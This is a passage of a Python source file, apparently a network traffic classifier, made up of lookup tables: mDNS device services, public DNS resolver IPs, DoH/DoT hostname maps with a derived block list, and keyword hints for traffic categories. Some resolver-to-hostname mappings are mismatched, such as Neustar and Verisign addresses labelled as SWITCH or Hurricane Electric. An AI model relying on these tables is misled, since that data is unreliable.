    "_hikvision._tcp": ("Hikvision","Camera"),
    "_dahua._tcp": ("Dahua","Camera"),
    "_reolink._tcp": ("Reolink","Camera"),
    "_amcrest._tcp": ("Amcrest","Camera"),
    "_foscam._tcp": ("Foscam","Camera"),
    "_nest._tcp": ("Nest","Camera"),
    "_ring._tcp": ("Ring","Camera"),
    "_arlo._tcp": ("Arlo","Camera"),
    "_wyze._tcp": ("Wyze","Camera"),
    "_blink._tcp": ("Blink","Camera"),
    "_eufy._tcp": ("Eufy","Camera"),
    "_august._tcp": ("August","Lock"),
    "_yale._tcp": ("Yale","Lock"),
    "_schlage._tcp": ("Schlage","Lock"),
    "_kwikset._tcp": ("Kwikset","Lock"),
    "_level._tcp": ("Level Lock","Lock"),
    "_nuki._tcp": ("Nuki","Lock"),
    "_nestsmarthome._tcp": ("Nest Home","IoT"),
    "_googlehome._tcp": ("Google Home","IoT"),
    "_amazonhome._tcp": ("Amazon Home","IoT"),
    "_smarthings._tcp": ("SmartThings","IoT"),
    "_smartthings._tcp": ("SmartThings (extra)","IoT"),
    "_wink._tcp": ("Wink","IoT"),
    "_hubitat._tcp": ("Hubitat","IoT"),
    "_homeassistant._tcp": ("Home Assistant","IoT"),
    "_home-assistant._tcp": ("Home Assistant (extra)","IoT"),
    "_hassio._tcp": ("Hass.io","IoT"),
    "_esphome._tcp": ("ESPHome (extra)","IoT"),
    "_tasmota-mqtt._tcp": ("Tasmota MQTT","IoT"),
    "_opensprinkler._tcp": ("OpenSprinkler","IoT"),
    "_rachio._tcp": ("Rachio","IoT"),
    "_rainmachine._tcp": ("RainMachine","IoT"),
    "_konnected._tcp": ("Konnected","IoT"),
    "_homebridge._tcp": ("Homebridge","IoT"),
    "_hoobs._tcp": ("HOOBS","IoT"),
    "_scrypted._tcp": ("Scrypted","IoT"),
    "_frigate._tcp": ("Frigate NVR","IoT"),
    "_motioneye._tcp": ("motionEye","IoT"),
    "_shinobi._tcp": ("Shinobi","IoT"),
    "_zoneminder._tcp": ("ZoneMinder","IoT"),
    "_blueiris._tcp": ("Blue Iris","IoT"),
    "_agentdvr._tcp": ("Agent DVR","IoT"),
    "_ispy._tcp": ("iSpy","IoT"),
    "_contacam._tcp": ("ContaCam","IoT"),
    "_ipcam._tcp": ("IPCam","IoT"),
    "_nvr._tcp": ("NVR","IoT"),
    "_dvr._tcp": ("DVR","IoT"),
    "_ipcamera._tcp": ("IP Camera","IoT"),
}

def _mdns_friendly(dom):
    if not dom: return None
    dl = dom.lower()
    if "._sub." in dl: dl = dl.split("._sub.", 1)[1]
    dl = dl.replace(".local", "").strip(".")
    best_label = None; best_len = -1
    for key, (label, _d) in MDNS_SERVICES.items():
        k = key.replace(".local", "").strip(".")
        if (dl == k or dl.startswith(k)) and len(k) > best_len:
            best_len = len(k); best_label = label
    return f"{best_label} (mDNS)" if best_label else None

RESOLVER_IPS = {
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "1.1.1.2", "1.0.0.2",
    "1.1.1.3", "1.0.0.3", "9.9.9.9", "9.9.9.10", "9.9.9.11",
    "149.112.112.112", "149.112.112.10", "149.112.112.11",
    "208.67.222.222", "208.67.220.220", "208.67.222.123", "208.67.220.123",
    "208.67.222.2", "208.67.220.2",
    "94.140.14.14", "94.140.15.15", "94.140.14.15", "94.140.15.16",
    "94.140.14.140", "94.140.14.141",
    "185.228.168.168", "185.228.169.168", "185.228.168.10", "185.228.169.11",
    "185.228.168.9", "185.228.169.9",
    "76.76.2.0", "76.76.10.0", "76.76.2.1", "76.76.2.2", "76.76.2.3",
    "185.222.222.222", "45.11.45.11",
    "119.29.29.29",
    "114.114.114.114", "114.114.115.115", "114.114.114.119", "114.114.115.119",
    "114.114.114.110", "114.114.115.110",
    "223.5.5.5", "223.6.6.6",
    "101.226.4.6", "218.30.118.6", "123.125.81.6", "140.207.198.6",
    "180.184.1.1", "180.184.2.2",
    "77.88.8.8", "77.88.8.1", "77.88.8.88", "77.88.8.2", "77.88.8.3", "77.88.8.7",
    "156.154.70.1", "156.154.71.1", "156.154.70.2", "156.154.71.2",
    "156.154.70.3", "156.154.71.3", "156.154.70.4", "156.154.71.4",
    "156.154.70.5", "156.154.71.5",
    "64.6.64.6", "64.6.65.6",
    "195.46.39.39", "195.46.39.40",
    "80.80.80.80", "80.80.81.81",
    "216.146.35.35", "216.146.36.36",
    "74.82.42.42",
    "54.174.40.213", "52.3.100.184",
    "101.101.101.101", "101.102.103.104",
    "116.121.57.111", "140.238.14.191",
    "193.58.251.251",
    "194.169.169.169",
    "86.54.11.1", "86.54.11.201", "86.54.11.12", "86.54.11.212",
    "86.54.11.13", "86.54.11.213", "86.54.11.11", "86.54.11.211",
    "86.54.11.100", "86.54.11.200",
    "5.2.75.75", "45.67.219.208",
    "85.209.2.112", "103.70.12.129",
    "160.19.167.150",
    "176.9.93.198", "176.9.1.117",
    "62.192.153.242", "62.192.153.243",
    "155.248.232.226",
    "88.198.92.222",
    "117.50.10.10", "52.80.52.52", "52.80.66.66", "117.50.22.22",
    "117.50.60.30", "52.80.60.30",
    "217.160.70.42",
    "209.250.227.42", "64.176.190.82",
    "104.155.237.225", "104.197.28.121",
    "185.71.138.138",
    "130.59.31.248",
    "193.17.47.1", "185.43.135.1",
    "83.220.169.155", "212.109.195.93", "195.133.25.16",
    "149.112.121.10", "149.112.122.10", "149.112.121.20", "149.112.122.20",
    "149.112.121.30", "149.112.122.30",
    "185.49.141.37", "145.100.185.15", "145.100.185.16",
    "89.233.43.71", "91.239.100.100", "199.58.81.218",
    "51.15.70.167", "81.187.221.24", "94.130.110.185", "94.130.110.178",
    "139.59.51.46", "89.234.186.112", "146.185.167.43",
    "200.1.123.46", "184.105.193.78",
    "78.47.212.211", "180.131.144.144", "180.131.145.145",
    "103.87.68.194", "103.87.68.196",
    "8.26.56.26", "8.20.247.20", "8.20.247.2",
    "185.95.218.42", "185.95.218.43",
    "94.130.180.225", "78.47.64.161",
    "51.38.83.141", "51.38.82.198",
    "174.138.21.128", "172.104.93.80",
    "213.196.191.96",
    "139.59.48.222",
    "185.121.177.177", "169.239.202.202",
}

DOH_RESOLVER_IPS = {
    "8.8.8.8":"dns.google","8.8.4.4":"dns.google",
    "1.1.1.1":"cloudflare-dns.com","1.0.0.1":"cloudflare-dns.com",
    "1.1.1.2":"security.cloudflare-dns.com","1.0.0.2":"security.cloudflare-dns.com",
    "1.1.1.3":"family.cloudflare-dns.com","1.0.0.3":"family.cloudflare-dns.com",
    "9.9.9.9":"dns.quad9.net","9.9.9.10":"dns10.quad9.net","9.9.9.11":"dns11.quad9.net",
    "149.112.112.112":"dns.quad9.net",
    "208.67.222.222":"doh.opendns.com","208.67.220.220":"doh.opendns.com",
    "94.140.14.14":"dns.adguard-dns.com","94.140.15.15":"dns.adguard-dns.com",
    "94.140.14.15":"family.adguard-dns.com","94.140.15.16":"family.adguard-dns.com",
    "94.140.14.140":"unfiltered.adguard-dns.com","94.140.14.141":"unfiltered.adguard-dns.com",
    "76.76.2.0":"freedns.controld.com","76.76.10.0":"freedns.controld.com",
    "76.76.2.1":"freedns.controld.com","76.76.2.2":"freedns.controld.com",
    "76.76.2.3":"freedns.controld.com",
    "185.228.168.168":"doh.cleanbrowsing.org","185.228.169.168":"doh.cleanbrowsing.org",
    "185.228.168.10":"doh.cleanbrowsing.org","185.228.169.11":"doh.cleanbrowsing.org",
    "185.228.168.9":"doh.cleanbrowsing.org","185.228.169.9":"doh.cleanbrowsing.org",
    "185.222.222.222":"doh.dns.sb","45.11.45.11":"doh.dns.sb",
    "119.29.29.29":"dns.pub",
    "223.5.5.5":"dns.alidns.com","223.6.6.6":"dns.alidns.com",
    "77.88.8.8":"common.dot.dns.yandex.net","77.88.8.1":"common.dot.dns.yandex.net",
    "77.88.8.88":"safe.dot.dns.yandex.net","77.88.8.2":"safe.dot.dns.yandex.net",
    "77.88.8.3":"family.dot.dns.yandex.net","77.88.8.7":"family.dot.dns.yandex.net",
    "156.154.70.1":"ordns.he.net","156.154.71.1":"ordns.he.net",
    "74.82.42.42":"ordns.he.net",
    "64.6.64.6":"dns.switch.ch","64.6.65.6":"dns.switch.ch",
    "101.101.101.101":"101.101.101.101",
    "193.17.47.1":"odvr.nic.cz","185.43.135.1":"odvr.nic.cz",
    "194.169.169.169":"dns.surfsharkdns.com",
    "86.54.11.1":"protective.joindns4.eu","86.54.11.12":"child.joindns4.eu",
    "86.54.11.13":"noads.joindns4.eu","86.54.11.11":"child-noads.joindns4.eu",
    "86.54.11.100":"unfiltered.joindns4.eu",
    "45.67.219.208":"doh.la.ahadns.net","5.2.75.75":"doh.nl.ahadns.net",
    "155.248.232.226":"dns.jupitrdns.com",
    "88.198.92.222":"doh.libredns.gr",
    "117.50.10.10":"doh-pure.onedns.net","52.80.52.52":"doh-pure.onedns.net",
    "52.80.66.66":"doh.onedns.net","117.50.22.22":"doh.onedns.net",
    "160.19.167.150":"dns.caliph.dev",
    "185.71.138.138":"wikimedia-dns.org",
    "209.250.227.42":"resolver.dnsprivacy.org.uk","64.176.190.82":"resolver.dnsprivacy.org.uk",
    "130.59.31.248":"dns.switch.ch",
    "103.87.68.194":"dns.bebasid.com","103.87.68.196":"internetsehat.bebasid.com",
}

DOT_RESOLVER_IPS = {
    "8.8.8.8":"dns.google (DoT)","8.8.4.4":"dns.google (DoT)",
    "1.1.1.1":"one.one.one.one (DoT)","1.0.0.1":"one.one.one.one (DoT)",
    "9.9.9.9":"dns.quad9.net (DoT)","149.112.112.112":"dns.quad9.net (DoT)",
    "208.67.222.222":"dns.opendns.com (DoT)","208.67.220.220":"dns.opendns.com (DoT)",
    "94.140.14.14":"dns.adguard-dns.com (DoT)",
    "185.228.168.168":"family-filter-dns.cleanbrowsing.org (DoT)",
    "76.76.2.0":"p0.freedns.controld.com (DoT)",
    "185.222.222.222":"dot.sb (DoT)","45.11.45.11":"dot.sb (DoT)",
    "119.29.29.29":"dot.pub (DoT)",
    "223.5.5.5":"dns.alidns.com (DoT)","223.6.6.6":"dns.alidns.com (DoT)",
    "77.88.8.8":"common.dot.dns.yandex.net (DoT)",
    "156.154.70.1":"dns.switch.ch (DoT)",
    "74.82.42.42":"ordns.he.net (DoT)",
    "64.6.64.6":"dns.switch.ch (DoT)",
    "101.101.101.101":"101.101.101.101 (DoT)",
    "193.17.47.1":"odvr.nic.cz (DoT)",
    "194.169.169.169":"dns.surfsharkdns.com (DoT)",
    "86.54.11.1":"protective.joindns4.eu (DoT)",
    "45.67.219.208":"dot.la.ahadns.net (DoT)",
    "155.248.232.226":"dns.jupitrdns.com (DoT)",
    "160.19.167.150":"dns.caliph.dev (DoT)",
    "185.71.138.138":"wikimedia-dns.org (DoT)",
    "209.250.227.42":"resolver.dnsprivacy.org.uk (DoT)",
    "130.59.31.248":"dns.switch.ch (DoT)",
    "103.87.68.194":"dns.bebasid.com (DoT)",
}

DOH_BLOCK_IPS = sorted(set(list(DOH_RESOLVER_IPS.keys())
                            + list(DOT_RESOLVER_IPS.keys())))

CALL_HINTS = ("zoom","teams","meet.google","skype","whatsapp","discord","voip",
              "facetime","webex","gotomeeting","bluejeans","jitsi","whereby",
              "around","mmhmm","gather","wonder","teams.microsoft","teams.live",
              "line","viber","kakao","wechat","signal","telegram","wire",
              "element","matrix","ringcentral","dialpad","8x8","vonage",
              "twilio","plivo","sinch","agora","tokbox","daily.co","livekit",
              "jitsi.org","bluejeans.com","starleaf","pexip","zoom.us","zoomgov",
              "gvoice","hangouts","duo.google","goto.com","join.me",
              "uberconference","freeconferencecall","zoomgov.com",
              "dialpad.com","talkdesk","five9","nice-incontact","genesys",
              "chime.aws")

CALL_PORTS = {3478,3479,3480,19302,19303,19304,50000,50001,5060,5061,5062,
              10000,16384,16385,16386,16387,16388,16389,16390,16391,16392,
              16393,16394,16395,16396,16397,16398,16399,16400,16401,16402,
              16403,16404,16405,16406,16407,16408,16409,16410}

NON_CALL_UDP_PORTS = {443, 80, 853, 53, 123, 5353, 1900, 5355, 5354}

VIDEO_HINTS = ("youtube","googlevideo","netflix","nflxvideo","twitch","tiktok",
               "byteoversea","vimeo","primevideo","disneyplus","hotstar","hulu",
               "hbomax","peacocktv","paramountplus","crunchyroll","dailymotion",
               "bilibili","iqiyi","rumble","odysee","plex","emby","jellyfin",
               "kodi","xiaohongshu","weibo","sonyliv","zee5","jiocinema",
               "streamtape","doodstream","mixdrop","upstream","voe","vidcloud",
               "filemoon","mp4upload","yourupload","fastplay","streamhide",
               "vidsrc","2embed","embed","player","cdn-video","videocdn",
               "hbomaxcdn","max.com","discoveryplus","discovery","paramount",
               "shudder","acorn.tv","britbox","sundance","criterion",
               "mubi","kanopy","tubitv","pluto.tv","xumo","roku",
               "plex.tv","emby.media","jellyfin.org","apple.tv",
               "atv-ext","warnerbros","mgm","lionsgate","studiocanal",
               "kanopy.com","hoopla","vudu","fandangonow")

MSG_HINTS = ("whatsapp","telegram","t.me","signal","messenger","slack",
             "discord","line.me","viber","wechat","kakao","snapchat",
             "instagram","threads.net","imessage","facetime","hangouts",
             "chat.google","meet.google","zalo","kakaotalk","imo.im",
             "chatwork","rocket.chat","element.io","matrix.org","mattermost",
             "zulip","zalo.me","revolt.chat","guilded.gg","streamlabs",
             "jabber","xmpp","irc","quassel","thelounge","riot.im",
             "signal.org","session","wire.com","threema","wickr",
             "dust","conversations","monocles","briar","briarproject",
             "qtox","tox.chat","utox","toxic","qtox.org")

AUDIO_HINTS = ("scdn.co","spotify","soundcloud","music.apple","deezer","tidal",
               "audible","pandora","iheart","qqmusic","kugou","kuwo","migu",
               "joox","melon","genie","bugs","vibe","gaana","jiosaavn","wynk",
               "resso","boomplay","audiomack","napster","8tracks","mixcloud",
               "bandcamp","beatport","juno","traxsource","music.yandex",
               "shazam","soundhound","last.fm","discogs","musicbrainz",
               "music.apple.com","music.youtube","spotifycdn","audioaddict",
               "di.fm","radiotunes","somafm","radio paradise","kotori",
               "tidal.com","deezer.com","qobuz","eclassical","primephonic")

GAMING_HINTS = ("riotgames","roblox","epicgames","steam","playstation",
                "xboxlive","nintendo","pubgmobile","battle.net","garena",
                "supercell","ubisoft","ea.com","gog.com","itch.io",
                "rockstargames","bungie","activision","callofduty","fortnite",
                "eaplay","geforcenow","stadia","luna.amazon","xcloud",
                "playstation.net","psn","xboxlive.com","nintendo.net",
                "mihoyo","hoyoverse","genshin","honkai","arknights","azurlane",
                "girlsfrontline","fgo","bandainamco","square-enix","capcom",
                "eaorigin","origin.com","uplay","ubisoftconnect",
                "blizzard","worldofwarcraft","overwatch","diablo","hearthstone",
                "starcraft","heroesofthestorm","wowhead","curseforge",
                "steampowered","steamcommunity","steamcontent","steamstatic",
                "epicgames.com","fortnite.com","unrealengine",
                "rockstargames.com","socialclub","gta","rdr2",
                "2k.com","take2","nba2k","wwe2k","borderlands",
                "activision.com","callofduty.com","warzone",
                "bungie.net","destiny","halo","343industries",
                "ea.com","battlefield","fifa","nhl","madden","apex",
                "nintendo.com","switch","3ds","wii",
                "pokemon","pokemongo","niantic","ingress",
                "supercell.com","clashofclans","clashroyale","brawlstars",
                "hayday","boom beach","epic7","summonerswar",
                "garena.com","freefire","leagueoflegends","leagueoflegends.com",
                "valorant","legends of runeterra","teamfight tactics",
                "mihoyo.com","hoyoverse.com","genshin.com","honkai impact",
                "kurogames","wutheringwaves","arknights","hypergryph")

UPDATE_HINTS = ("windowsupdate","update.microsoft","gvt1.com","dl.google.com",
                "mesu.apple.com","swcdn.apple.com","android.clients.google",
                "play.googleapis","update.googleapis","aus","samsung",
                "lg.com/update","sony.com/update","huawei.com/update",
                "xiaomi.com/update","miui.com","coloros","funtouch",
                "realme.com/update","oneplus.com/update","oppo.com/update",
                "vivo.com/update","lenovo.com/update","dell.com/update",
                "hp.com/update","asus.com/update","acer.com/update",
                "linuxmint.com","ubuntu.com","debian.org","fedoraproject.org",
                "archlinux.org","opensuse.org","redhat.com","centos.org",
                "suse.com","rockylinux.org","almalinux.org",
                "python.org","nodejs.org","golang.org","rust-lang.org",
                "docker.com","kubernetes.io","istio.io",
                "helm.sh","prometheus.io","grafana.com")

BACKUP_HINTS = ("icloud.com","photos.google","backup","dropbox","onedrive",
                "drive.google","mega.nz","pcloud","backblaze","carbonite",
                "crashplan","idrive","acronis","veeam","commvault","rubrik",
                "cohesity","datto","barracuda","unitrends","druva","clumio",
                "veritas","netbackup","bakbone","hitachi vantara",
                "pure storage","purestorage","netapp","netapp.com",
                "synology","qnap","drobo","wd.com","seagate","seagate.com",
                "truenas","freenas","unraid","openmediavault","nas",
                "nextcloud","owncloud","seafile","syncthing","resilio",
                "goodsync","foldersync","tresorit","spideroak",
                "wasabi","wasabi.com","b2.backblaze","amazon glacier",
                "aws glacier","glacier","deep archive","nearline",
                "coldline","archive storage")

REMOTE_HINTS = ("teamviewer","anydesk","rustdesk","vnc","screenconnect",
                "logmein","gotomypc","splashtop","chrome-remote-desktop",
                "rdp","xrdp","parsec","moonlight-stream","nomachine",
                "remotepc","dwservice","guacamole","meshcentral","tacticalrmm",
                "splashtop.com","jumpdesktop","jumpcloud","bomgar","beyondtrust",
                "nutanixframe","frame.nutanix","amazonworkspaces","workspaces",
                "citrix","citrix.com","xendesktop","xenapp","vdi",
                "vmware horizon","horizon","vsphere","esxi","vcenter",
                "proxmox","xcp-ng","openstack","oVirt","zabbix","nagios",
                "icinga","observium","librenms","cacti","pandora fms",
                "prtg","paessler","checkmk","sensu","riemann","zabbix.com")

P2P_HINTS = ("torrent","utorrent","bittorrent","transmission","qbittorrent",
             "deluge","vuze","frostwire","limewire","emule","edonkey",
             "gnutella","ares","kazaa","dc++","eiskaltdcpp","airdcpp",
             "resilio","syncthing","ipfs","bitswap","webtorrent",
             "tracker","announce","peer","leech","seed","magnet",
             "thepiratebay","piratebay","1337x","rarbg","yts","eztv",
             "limetorrents","torlock","zooqle","solidtorrents","btdig","bt4g",
             "torrentz","kickass","kat.cr","extratorrent","torrentgalaxy",
             "nyaatorrents","nyaa","anidex","animetosho","sukebei",
             "sci-hub","libgen","librarygenesis","annas-archive","z-lib")

TELEMETRY_HINTS = ("telemetry","tracker","analytics","doubleclick","appsflyer",
                   "mixpanel","crashlytics","sentry","bugsnag","amplitude",
                   "segment.io","segment.com","heap.io","kissmetrics","kiss",
                   "matomo","piwik","plausible","umami","fathom","goatcounter",
                   "hotjar","fullstory","logrocket","smartlook","clarity.ms",
                   "newrelic","datadoghq","instana","dynatrace","appdynamics",
                   "newrelic.com","datadoghq.com","instana.com","dynatrace.com",
                   "appdynamics.com","elastic.co","elastic.com","sumologic",
                   "logz.io","papertrail","loggly","splunk","splunkcloud",
                   "graylog","fluentd","fluentbit","vector.dev","logstash",
                   "kafka","confluent","redpanda","rabbitmq","amqp",
                   "mqtt","mosquitto","emqx","hivemq","vernemq",
                   "statsd","graphite","prometheus.io","victoriametrics",
                   "thanos","cortex","loki","tempo","mimir")

CLOUD_SYNC_HINTS = ("backup","sync","dropbox","drive.google","icloud",
                    "onedrive",
                    "sync.com","pcloud","mega.nz","mediafire","box.com",
                    "nextcloud","owncloud","seafile","syncthing","resilio",
                    "goodsync","folder-sync","tresorit","spideroak",
                    "dropboxapi","dropboxstatic","dropboxusercontent",
                    "onedrive.live","sharepoint.com","sharepointonline",
                    "microsoftonline","microsoft.com","office.net",
                    "googleusercontent","googleapis","gstatic","ggpht",
                    "icloud.com","icloud.com.cn","icloud-content.com",
                    "me.com","mac.com","mzstatic","apple-cloudkit",
                    "cloudkit","ckdatabase","cloudfront","s3.amazonaws",
                    "s3-","amazonaws.com","cloudfront.net","akamaihd",
                    "akamaized","edgekey","edgesuite","fastly","cachefly",
                    "stackpath","cdn77","keycdn","bunnycdn","bunny.net")

VIDEO_UPLOAD_HINTS = ("upload.youtube","studio.youtube","upload.tiktok",
                      "upload.instagram","upload.facebook","upload.vimeo",
                      "studio.tiktok","upload.dailymotion","upload.bilibili",
                      "upload.twitch","upload.kick","upload.rumble",
                      "upload.odysee","studio.tiktok.com","business.facebook",
                      "creatorstudio","studio","creator","upload",
                      "streamyard","restream","castr","be.live","melonapp",
                      "prismlive","obsproject","streamlabs","streamelements",
                      "nightbot","moobot","fossabot","wizebot","mixitup")

LIVE_STREAM_HINTS = ("live.","twitch.tv","youtube.com/live","facebook.com/live",
                     "live.instagram","live.tiktok","kick.com","trovo.live",
                     "bigo.tv","showroom","17.live","pococha","iriam",
                     "mildom","openrec","twitcasting","mixch","frfr.live",
                     "bilibili.com/live","douyu","huya","yy.com",
                     "afreecatv","afreeca","naver.now","now.naver",
                     "vaughnlive","vaughn","stream.me","streamme",
                     "dlive","dlive.tv","theta","theta.tv","rumble.live")

EMAIL_HINTS = ("gmail","mail.google","outlook","office365","yahoo","protonmail",
               "tutanota","fastmail","zoho","gmx","mail.ru","163.com",
               "126.com","qqmail","yandex.mail","icloud.com/mail",
               "aol.com","hotmail","live.com","msn.com","me.com",
               "proton.me","protonmail.com","protonmail.ch","tuta.io",
               "tutanota.com","tutanota.de","keemail.me","fastmail.com",
               "fastmail.fm","fastmailusercontent","messagingengine",
               "zoho.com","zohomail","zoho.eu","zoho.in",
               "gmx.com","gmx.net","gmx.de","web.de","mail.com",
               "yandex.com","yandex.ru","ya.ru","yandex.net",
               "qq.com","foxmail","foxmail.com","163.net","yeah.net",
               "sina.com","sohu.com","aliyun","aliyun.com","dingtalk",
               "feishu","larksuite","wecom","qiye.163.com","exmail.qq")

VPN_HINTS = ("nordvpn","expressvpn","surfshark","protonvpn","mullvad","openvpn",
             "wireguard","ipsec","ipvanish","privatevpn","purevpn","hidemyass",
             "cyberghost","hotspot-shield","windscribe","tunnelbear","strongvpn",
             "vyprvpn","astrill","hide.me","perfect-privacy","ovpn","zerotier",
             "tailscale","hamachi","softether","tinc","nebula",
             "privateinternetaccess","pia","pia-vpn","privatevpn.com",
             "nordvpn.com","expressvpn.com","surfshark.com","protonvpn.com",
             "mullvad.net","ipvanish.com","privatevpn.net","purevpn.com",
             "cyberghostvpn.com","hotspotshield.com","windscribe.com",
             "tunnelbear.com","strongvpn.com","vyprvpn.com","astrill.com",
             "hide.me","perfect-privacy.com","ovpn.com","zerotier.com",
             "tailscale.com","hamachi.cc","softether.org","tinc-vpn.org",
             "nebula","slack-vpn","wireguard.com")

VOIP_APP_HINTS = ("whatsapp","telegram","signal","viber","line.me","kakao",
                  "wechat","messenger","skype","discord","zoom","teams",
                  "facetime","webex","gotomeeting","bluejeans","jitsi",
                  "whereby","meet.google","duo.google","hangouts",
                  "vonage","ringcentral","dialpad","8x8","nextiva",
                  "grasshopper","ooma","magicjack","google voice",
                  "sip","asterisk","freeswitch","kamailio","opensips")

FILE_SHARE_HINTS = ("dropbox","onedrive","drive.google","mega.nz","wetransfer",
                    "mediafire","sendspace","send-anywhere","transfernow",
                    "filemail","smash","fromsmash","swisstransfer","pcloud",
                    "sync.com","tresorit","spideroak","box.com","zippyshare",
                    "rapidgator","uploaded.net","turbobit","nitroflare",
                    "katfile","1fichier","filefactory","depositfiles",
                    "uploadhaven","upstore","alfafile","filejoker",
                    "k2s","keep2share","tezfiles","fboom","fileboom",
                    "mediafire.com","sendspace.com","wetransfer.com",
                    "smash.com","fromsmash.com","swisstransfer.com",
                    "sync.com","tresorit.com","spideroak.com",
                    "mega.io","mega.nz","krakenfiles","gofile.io","gofile",
                    "anonfiles","bayfiles","pixeldrain","catbox.moe",
                    "litter.catbox","litterbox","tmpfiles.org","file.io")

IOT_HINTS = ("tuya","smartlife","meross","xiaomi","mi.com","smartthings",
             "philips-hue","sonoff","shelly","tasmota","esphome",
             "home-assistant",
             "hass.io","homebridge","hoobs","wemo","belkin","tplink","tapo",
             "kasa","meross.com","smartlife.app","ewelink","govee","nanoleaf",
             "lifx","yeelight","wizconnected","nest","ring","arlo","wyze",
             "blink","eufy","august","yalehome","schlage","kwikset",
             "level.co","nuki","igloohome","lockly","latch","danalock",
             "tuya.com","tuyaos.com","tuyaus","meross.net",
             "smartthings.com","smartthingscloud","philips.com","hue",
             "signify","wiz","shelly.cloud","tasmota.github",
             "home-assistant.io","homeassistant","hassio","nabucasa",
             "duckdns","duckdns.org","dynu","no-ip","noip","dyndns",
             "freedns.afraid.org","afraid.org","freedns","changeip")

WIFI_CALL_HINTS = ("vowifi","vo-wifi","ims.","epc.mnc","mms.","3gppnetwork",
                   "ims.mnc","ims.mcc","ims.operator","vowifi.operator",
                   "voice.gsm","voice.operator","vowifi.operator")

SOCIAL_HINTS = ("facebook","instagram","tiktok","twitter","x.com","reddit",
                "snapchat","discord","telegram","whatsapp","signal","wechat",
                "weibo","xiaohongshu","zhihu","douyin","kuaishou","bilibili",
                "linkedin","pinterest","tumblr","mastodon","bluesky","threads",
                "vk.com","ok.ru","quora","weheartit","imgur","9gag",
                "reddit.com","old.reddit","i.reddit","v.reddit",
                "facebook.com","fbcdn","fbsbx","messenger.com",
                "instagram.com","cdninstagram","igcdn",
                "tiktok.com","tiktokcdn","tiktokv","musical.ly",
                "twitter.com","twimg","t.co",
                "redditstatic","redd.it","redditmedia",
                "snapchat.com","snap.com","sc-cdn","snapkit",
                "discord.com","discordapp","discordapp.net","discord.gg",
                "telegram.org","t.me","telegram.me","telesco.pe",
                "whatsapp.net","whatsapp.com","wa.me",
                "signal.org","whispersystems","signal.art",
                "wechat.com","weixin.qq","wx.qq","weixin.com",
                "weibo.com","weibocdn","sinaimg","sina.com",
                "xiaohongshu.com","xhscdn","xhslink",
                "zhihu.com","zhimg.com","zhihuishu",
                "douyin.com","douyinpic","douyinvod","douyincdn",
                "kuaishou.com","kwaicdn","kskwai",
                "bilibili.com","hdslb","biliapi","acgvideo",
                "linkedin.com","licdn","lnkd.in",
                "pinterest.com","pinimg","pin.it",
                "tumblr.com","tumblr.co","tumblrstatic",
                "mastodon.social","mastodon.online","mstdn",
                "bsky.app","bsky.social","bsky.network",
                "threads.net","threads.com",
                "vk.com","userapi","vk.me","vk.cc",
                "ok.ru","odnoklassniki","mycdn.me",
                "quora.com","quoracdn","qr.ae",
                "weheartit.com","whi.imgix",
                "imgur.com","imgur.io","i.imgur",
                "9gag.com","9cache","9gagcdn")

SEARCH_HINTS = (
    "google.", "bing.com", "duckduckgo.", "yandex.", "baidu.", "yahoo.",
    "search.", "ask.com", "aol.com/search", "naver.com", "daum.net",
    "sogou.com", "so.com", "360.cn", "haosou.com", "shenma.com",
    "seznam.cz", "qwant.com", "ecosia.org", "startpage.com",
    "brave.com/search", "search.brave", "mojeek.com", "marginalia.nu",
    "searx.", "presearch.com", "you.com", "kagi.com", "perplexity.ai",
    "phind.com", "neeva.com", "andi.com", "arc.net", "genie",
    "lycos.com", "webcrawler.com", "dogpile.com", "metacrawler.com",
    "info.com", "excite.com", "hotbot.com", "looksmart.com",
    "yep.com", "rightdao.com", "gibiru.com", "swisscows.com",
    "metager.org", "metager.de", "nate.com", "zum.com",
    "search.naver", "search.daum", "search.yahoo", "search.aol",
    "lite.duckduckgo", "html.duckduckgo", "images.google",
    "lens.google", "images.yandex", "images.bing", "tineye",
    "saucenao", "search.semanticscholar", "scholar.google",
    "academic.bing", "base-search", "core.ac.uk", "pubmed",
    "arxiv.org", "jstor", "researchgate", "academia.edu",
    "sci-hub", "libgen", "annas-archive", "z-lib", "torrentz",
    "thepiratebay", "1337x", "rarbg", "yts.mx", "eztv",
    "limetorrents", "torlock", "zooqle", "solidtorrents", "btdig", "bt4g",
    "youtube.com/results", "vimeo.com/search", "dailymotion",
    "bilibili.com/search", "nicovideo", "rumble.com", "odysee.com",
    "peertube", "github.com/search", "gitlab.com/search",
    "bitbucket.org", "sourcegraph", "grep.app", "searchcode",
    "publicwww", "nerdydata", "pinterest.com/search", "flickr",
    "unsplash", "pexels", "pixabay", "amazon.com/s", "ebay.com/sch",
    "aliexpress", "walmart.com/search", "etsy.com/search",
    "alibaba.com", "taobao.com", "jd.com", "flipkart.com",
    "rakuten.co", "mercadolibre", "news.google", "news.bing",
    "news.yahoo", "apple.news", "flipboard", "feedly", "inoreader",
    "twitter.com/search", "x.com/search", "facebook.com/search",
    "reddit.com/search", "instagram.com/explore", "tiktok.com/search",
    "linkedin.com/search", "tumblr.com/search", "mastodon.social",
    "bsky.app", "threads.net", "vk.com/search", "weibo.com/search",
    "search.naver.com", "search.daum.net", "sogou.com/web",
    "so.com/s", "sm.cn", "chinaso.com", "yandex.com/search",
    "yandex.ru/search", "go.mail.ru", "rambler.ru", "nigma.ru",
    "sputnik.ru", "meta.ua", "ukr.net", "bigmir.net",
    "search.seznam", "atlas.cz", "centrum.cz", "naver.jp",
    "goo.ne.jp", "biglobe.ne.jp", "excite.co.jp", "infoseek.co.jp",
    "fresheye.co.jp", "yahoo.co.jp", "bing.com/search", "baidu.jp",
    "search.naver.jp", "google.co.kr", "google.co.jp", "google.de",
    "google.co.uk", "google.fr", "google.es", "google.it",
    "google.com.br", "google.com.mx", "google.com.ar", "google.cl",
    "google.com.co", "google.com.pe", "google.com.ve", "google.co.in",
    "google.co.id", "google.com.au", "google.co.nz", "google.co.za",
    "google.ae", "google.sa", "google.com.eg", "google.com.tr",
    "google.ru", "google.com.ua", "google.pl", "google.nl",
    "google.be", "google.at", "google.ch", "google.se", "google.no",
    "google.dk", "google.fi", "google.ie", "google.pt", "google.gr",
    "google.cz", "google.sk", "google.hu", "google.ro", "google.bg",
    "google.hr", "google.si", "google.rs", "google.com.hk",
    "google.com.tw", "google.com.sg", "google.com.my", "google.co.th",
    "google.com.ph", "google.com.vn", "google.com.pk", "google.com.bd",
    "google.lk", "google.com.np", "google.com.kh", "google.com.mm",
    "yandex.com.tr", "yandex.kz", "yandex.by", "yandex.ua",
